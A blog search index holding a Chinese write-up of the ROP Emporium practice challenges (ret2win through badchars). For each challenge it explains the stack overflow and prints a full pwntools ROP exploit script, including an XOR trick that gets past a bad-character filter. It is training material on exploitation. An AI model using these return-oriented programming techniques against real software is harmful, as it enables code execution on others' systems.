<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ROP_Emporium详解</title>
    <link href="/posts/716baf74/"/>
    <url>/posts/716baf74/</url>
    
    <content type="html"><![CDATA[<h1 id="challenge-1"><a class="markdownIt-Anchor" href="#challenge-1"></a> Challenge 1</h1><h2 id="ret2win32"><a class="markdownIt-Anchor" href="#ret2win32"></a> ret2win32</h2><p>checksec查看文件保护措施</p><p><img src="/posts/716baf74/image-20221103152716601.png" alt="image-20221103152716601"></p><p>用ida看下代码</p><p><img src="/posts/716baf74/image-20221103152759689.png" alt="image-20221103152759689"></p><p>发现read存在栈溢出，缓冲区大小为0x28</p><p>同时存在可以直接利用的函数</p><p><img src="/posts/716baf74/image-20221103152843343.png" alt="image-20221103152843343"></p><p><img src="/posts/716baf74/image-20221103152905146.png" alt="image-20221103152905146"></p><p>所以构造exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./ret2win32&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>ret2win=<span class="hljs-number">0x804862c</span><br>payload =junk+ p32(ret2win)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ret2win64"><a class="markdownIt-Anchor" href="#ret2win64"></a> ret2win64</h2><p>64位基本相同，缓冲区大小和ret2win函数地址发生变化，修改一下这些就可以</p><p>但是实际还是遇到了问题，ret2win函数成功执行了，但是flag一直没有打出来，后来发现还是system函数的栈对齐问题，这个函数在ubuntu18以上中需要使得栈对齐0x10，所以需要给他加一个ret来使栈对齐。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./ret2win&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>ret2win=<span class="hljs-number">0x400756</span><br>ret=<span class="hljs-number">0x4006E7</span><br>payload =junk+ p64(ret)+p64(ret2win)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="challenge-2"><a class="markdownIt-Anchor" href="#challenge-2"></a> Challenge 2</h1><h2 id="split32"><a class="markdownIt-Anchor" href="#split32"></a> split32</h2><p>代码和上面基本上一样，没有了可以直接利用的函数，但是shift+f12可以发现一个有用的字符串</p><p><img src="/posts/716baf74/image-20221103161840597.png" alt="image-20221103161840597"></p><p><img src="/posts/716baf74/image-20221103161834209.png" alt="image-20221103161834209"></p><p>同时text段里也有直接调用system的代码</p><p><img src="/posts/716baf74/image-20221103161734111.png" alt="image-20221103161734111"></p><p>所以可以通过构造栈来完成ROP攻击，将/bin/cat flag.txt作为system函数的参数调用</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./split32&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>system = <span class="hljs-number">0x804861A</span><br>bincat = <span class="hljs-number">0x804A030</span><br>payload =junk+ p32(system)+p32(bincat)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>也可以用plt表里system函数的地址，因为call最终也是通过转到plt表，然后再通过got表来找到system函数的真实地址的。</p><p>这样的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./split32&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>system = <span class="hljs-number">0x80483E0</span><br>bincat = <span class="hljs-number">0x804A030</span><br>payload =junk+ p32(system)+p32(<span class="hljs-number">0</span>)+p32(bincat)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="split64"><a class="markdownIt-Anchor" href="#split64"></a> split64</h2><p>64位的区别为参数不再以压栈的方式提供给函数，而是依次将前六个参数保存在rdi,rsi,rdx,rcx,r8,r9中，后面还有参数才通过压栈传递。</p><p>而system函数需要一个参数“/bin/cat flag.txt”，所以我们需要一个pop rdi; ret指令来将字符串放入rdi中</p><p>采用ROPgadget来查找这个指令</p><p><img src="/posts/716baf74/image-20221103163234081.png" alt="image-20221103163234081"></p><p>exp构造如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># elf = ELF(&#x27;./ciscn_2019_en_2&#x27;)</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./split&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>system = <span class="hljs-number">0x40074B</span><br>bincat = <span class="hljs-number">0x601060</span><br>pop_rdi_ret=<span class="hljs-number">0x4007c3</span><br>payload =junk+p64(pop_rdi_ret) +p64(bincat)+p64(system)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="challenge-3"><a class="markdownIt-Anchor" href="#challenge-3"></a> Challenge 3</h1><h2 id="callme32"><a class="markdownIt-Anchor" href="#callme32"></a> callme32</h2><p>题目还是和之前的一样，但是这题要求连续调用三个函数，callme_one,callme_two,callme_three。</p><p>这三个函数时外部函数，但是我们可以通过其plt表来调用它们。</p><p>同时根据题目所给的libccallme32.so文件，我们可知这三个函数有三个参数，需要让这三个参数等于下面的值。</p><p><img src="/posts/716baf74/image-20221103190752638.png" alt="image-20221103190752638"></p><p>为了连续调用，我们需要手动控制栈帧，因为在调用one的时候栈里放入了三个参数，这会影响接下来的调用，所以我们要找一个具有三个pop并以ret结尾的指令来将这三个参数出栈。</p><p>用ROPgadget找一下：</p><p><img src="/posts/716baf74/image-20221103191045702.png" alt="image-20221103191045702"></p><p>所以exp构造如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./callme32&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./callme32&#x27;</span>)<br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>callmeone=elf.plt.callme_one<br>callmetwo=elf.plt.callme_two<br>callmethree=elf.plt.callme_three<br>pop3=<span class="hljs-number">0x080487f9</span><br>a1=<span class="hljs-number">0xDEADBEEF</span><br>a2=<span class="hljs-number">0xCAFEBABE</span><br>a3=<span class="hljs-number">0xD00DF00D</span><br>payload=junk+p32(callmeone)+p32(pop3)+p32(a1)+p32(a2)+p32(a3)<br>payload+=p32(callmetwo)+p32(pop3)+p32(a1)+p32(a2)+p32(a3)<br>payload+=p32(callmethree)+p32(pop3)+p32(a1)+p32(a2)+p32(a3)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="callme64"><a class="markdownIt-Anchor" href="#callme64"></a> callme64</h2><p>64位的变化在于传参方式改变，三个参数需要依次放入rdi,rsi,rdx，所以需要找一条这样的指令，如下</p><p><img src="/posts/716baf74/image-20221103191535295.png" alt="image-20221103191535295"></p><p>同时注意到三个参数的值也变了，需要换一下。</p><p><img src="/posts/716baf74/image-20221103191916858.png" alt="image-20221103191916858"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./callme&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./callme&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>callmeone=elf.plt.callme_one<br>callmetwo=elf.plt.callme_two<br>callmethree=elf.plt.callme_three<br>pop3=<span class="hljs-number">0x40093c</span><br>a1=<span class="hljs-number">0xDEADBEEFDEADBEEF</span><br>a2=<span class="hljs-number">0xCAFEBABECAFEBABE</span><br>a3=<span class="hljs-number">0xD00DF00DD00DF00D</span><br>payload =junk+p64(pop3) +p64(a1)+p64(a2)+p64(a3)+p64(callmeone)<br>payload+=p64(pop3) +p64(a1)+p64(a2)+p64(a3)+p64(callmetwo)<br>payload+=p64(pop3) +p64(a1)+p64(a2)+p64(a3)+p64(callmethree)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="challenge-4"><a class="markdownIt-Anchor" href="#challenge-4"></a> Challenge 4</h1><h2 id="write432"><a class="markdownIt-Anchor" href="#write432"></a> write432</h2><p>这题没有信息，来pwnme也是外部函数了，但是根据前面题目的套路，一般会有提示，所以就看一下usefulfunction，发现这个也是外部函数，所以还是去so文件看一下</p><p>pwnme函数还是和前面一样，print_file函数如下：</p><p><img src="/posts/716baf74/image-20221103200842809.png" alt="image-20221103200842809"></p><p>可知只要我们将其参数设置为“flag.txt&quot;，就可以让它打印出flag</p><p>而要达到这个目的，我们就要将&quot;flag.txt&quot;写入内存中。</p><p>用ROPgadget看一下mov指令，因为这个指令可以实现写操作</p><p>正好，图中指令正好可以实现这个目的，我们只要控制好edi和ebp的值即可，将edi设置为内存地址，将ebp设置为要写入的字符串。</p><p><img src="/posts/716baf74/image-20221103201210997.png" alt="image-20221103201210997"></p><p>所以我们再找一下有没有pop edi和pop ebp指令，正好第二条指令全部满足了</p><p><img src="/posts/716baf74/image-20221103201419217.png" alt="image-20221103201419217"></p><p>下面就是找可以写入的内存地址了。</p><p>用gdb run一下程序，然后用vmmap查看内存信息</p><p>可以看到如下的data段都是可写的</p><p><img src="/posts/716baf74/image-20221103201702507.png" alt="image-20221103201702507"></p><p>去ida里看下，发现正好是从plt开始的地方</p><p>plt不能修改，但是data段和bss段应该都可以写</p><p>我选择了data段，因为是32位程序，所以每次只能写入四个字节，需要分两次写入</p><p><img src="/posts/716baf74/image-20221103201830701.png" alt="image-20221103201830701"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./write432&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./write432&#x27;</span>)<br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>print_file=elf.plt.print_file<br>pop_edi_ebp=<span class="hljs-number">0x80485aa</span><br>mov_edi_ebp=<span class="hljs-number">0x8048543</span><br>data_addr=<span class="hljs-number">0x804a018</span><br><br>payload=junk+p32(pop_edi_ebp)+p32(data_addr)+<span class="hljs-string">b&#x27;flag&#x27;</span>+p32(mov_edi_ebp)<br>payload+=p32(pop_edi_ebp)+p32(data_addr+<span class="hljs-number">4</span>)+<span class="hljs-string">b&#x27;.txt&#x27;</span>+p32(mov_edi_ebp)<br>payload+=p32(print_file)+p32(<span class="hljs-number">0</span>)+p32(data_addr)<br><br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="write4"><a class="markdownIt-Anchor" href="#write4"></a> write4</h2><p>64位同理，找两个需要的gadget,如下</p><p><img src="/posts/716baf74/image-20221103202312776.png" alt="image-20221103202312776"></p><p><img src="/posts/716baf74/image-20221103202406717.png" alt="image-20221103202406717"></p><p>找可写入的内存地址</p><p><img src="/posts/716baf74/image-20221103202955980.png" alt="image-20221103202955980"></p><p><img src="/posts/716baf74/image-20221103202546411.png" alt="image-20221103202546411"></p><p>64位还需要一个传递参数的gadget，再找一下</p><p><img src="/posts/716baf74/image-20221103202728034.png" alt="image-20221103202728034"></p><p>因为是64位，所以只需要写一次就可以。</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./write4&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./write4&#x27;</span>)<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>print_file=elf.plt.print_file<br>mov_r14_r15=<span class="hljs-number">0x400628</span><br>pop_r14_r15=<span class="hljs-number">0x400690</span><br>data_addr=<span class="hljs-number">0x601028</span><br><br>pop_rdi=<span class="hljs-number">0x400693</span><br>payload =junk+p64(pop_r14_r15) +p64(data_addr)+<span class="hljs-string">b&#x27;flag.txt&#x27;</span>+p64(mov_r14_r15)<br>payload+=p64(pop_rdi)+p64(data_addr)+p64(print_file) <br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="challenge-5"><a class="markdownIt-Anchor" href="#challenge-5"></a> Challenge 5</h1><h2 id="badchars32"><a class="markdownIt-Anchor" href="#badchars32"></a> badchars32</h2><p>这题寻找和上面的write4很类似，不同之处在于pwnme函数多了badchar检查</p><p><img src="/posts/716baf74/image-20221103215654975.png" alt="image-20221103215654975"></p><p>当我们输入的字符串中含有上图所示的字符时，这些字符就会被替换掉。很不幸，我们要写入内存的flag.txt中正好含有上述字符。</p><p>解决办法就是通过异或加密来绕过检查。首先，在写入内存前，我们将其每个字符都异或一次，确保其中不存在badchar,</p><p>然后，在成功写入内存后，我们再通过寻找含有xor指令的gadget，来对内存中的数据进行异或解密，如果我们达到了绕过检查的目的。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221103</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./badchars32&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./badchars32&#x27;</span>)<br><br><span class="hljs-comment">#异或加密</span><br>badchars=[<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>xor_byte=<span class="hljs-number">0x1</span><br>target_string=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c=<span class="hljs-built_in">ord</span>(i)^xor_byte<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">in</span> badchars:<br>            xor_byte+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            target_string+=<span class="hljs-built_in">chr</span>(c)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(target_string)==<span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">break</span><br>    <br><br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>print_file=elf.plt.print_file<br><span class="hljs-comment">#写入内存需要的gadget</span><br>mov_edi_esi=<span class="hljs-number">0x804854f</span><br>pop_esi_edi_ebp=<span class="hljs-number">0x80485b9</span><br>data_addr=<span class="hljs-number">0x804a018</span><br><span class="hljs-comment">#对内存数据再进行一次异或需要的gadget</span><br>xor_ebp_bl=<span class="hljs-number">0x8048547</span><br>pop_ebx_esi_edi_ebp=<span class="hljs-number">0x80485b8</span><br><br>payload=junk<br>payload+=p32(pop_esi_edi_ebp)<br>payload+=target_string[:<span class="hljs-number">4</span>].encode()<br>payload+=p32(data_addr)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(mov_edi_esi)<br><br>payload+=p32(pop_esi_edi_ebp)<br>payload+=target_string[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>].encode()<br>payload+=p32(data_addr+<span class="hljs-number">4</span>)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(mov_edi_esi)<br><br><br><span class="hljs-comment">#等数据写入内存后，再通过xor指令来解密，从而绕过badchar检查</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target_string)):<br>    payload+=p32(pop_ebx_esi_edi_ebp)<br>    payload+=p32(xor_byte)<br>    payload+=p32(<span class="hljs-number">0</span>)<br>    payload+=p32(<span class="hljs-number">0</span>)<br>    payload+=p32(data_addr+i)<br>    payload+=p32(xor_ebp_bl)<br><br><br>payload+=p32(print_file)+p32(<span class="hljs-number">0</span>)+p32(data_addr)<br><br><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="badchars64"><a class="markdownIt-Anchor" href="#badchars64"></a> badchars64</h2><p>这题和32位基本上一样的套路，唯一需要注意的就是传参方式。</p><p>不过我在做这题的时候还是遇到了一个很恶心的错误，当我写完exp后，发现在对字符串解密时，字符串会被解密成“flag.tzt&quot;,这个z就是加密后的字母，这说明他并没有被解密，但是其他又很正常，说明代码应该没有问题才对。调试了半天发现每当要异或这个字母的时候，进入寄存器的根本不是这个字母的地址，而是另一个地址。</p><p>如图，可以看到，栈的分布没有问题，但是本该是0x60102e的地方变成了0x6010eb，导致这个地址的字母没有解密成功。</p><p><img src="/posts/716baf74/image-20221104132014356.png" alt="image-20221104132014356"></p><p>在这个地方卡了很久，后来在我室友的帮助下，才恍然发现，0xeb正好是那个badchar检验后被赋的值，而0x2e正好是’.‘的ascii码，因为这些放在payload上的地址是会经过badchar检验的，所以当到这个地址的时候，就被判断为是’.'了，所以那个地址就被修改了！</p><p>导致这个原因就是我把存字符串的地址选为了data段起始，028往上随便一加就到了02e了。</p><p>把他改为bss段起始就可以了。</p><p>exp如下：</p><p><img src="/posts/716baf74/image-20221104133623046.png" alt="image-20221104133623046"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221104</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./badchars&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./badchars&#x27;</span>)<br>    <br><span class="hljs-comment">#异或加密</span><br>badchars=[<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>xor_byte=<span class="hljs-number">0x1</span><br>target_string=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c=<span class="hljs-built_in">ord</span>(i)^xor_byte<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">in</span> badchars:<br>            xor_byte+=<span class="hljs-number">1</span><br>            